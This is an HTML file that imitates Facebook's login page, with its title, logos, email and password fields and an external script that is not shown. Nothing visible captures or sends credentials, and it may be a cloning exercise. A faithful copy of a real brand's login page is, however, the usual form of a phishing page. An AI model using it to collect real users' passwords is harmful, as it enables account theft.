<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>facebook - log in or sign up</title>
    <link rel="stylesheet" href="styles.css" />
</head>
<body>
    <div class="content">
        <div class="title">
            <img src="IMG/facebook-logo.png" alt="Facebook Logo" id="desktop" />
            <img src="IMG/mobile-facebook-logo.png" alt="Facebook Logo" id="mobile" />
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="login-form">
            <form> 
                <input type="text" placeholder="Email address or phone number" id="Email" />
                <input type="password" placeholder="Password" id="Password" />
                <input type="button" value="Log in" name="Log in" id="Login" />
                <p>Forgotten password?</p>
                <button id="Create_Account">Create new account</button>
            </form>
            <h6><span>Create a Page</span> for a celebrity, brand or business.</h6>
        </div>
    </div>
    <script src="main.js"></script>
</body>
</html>
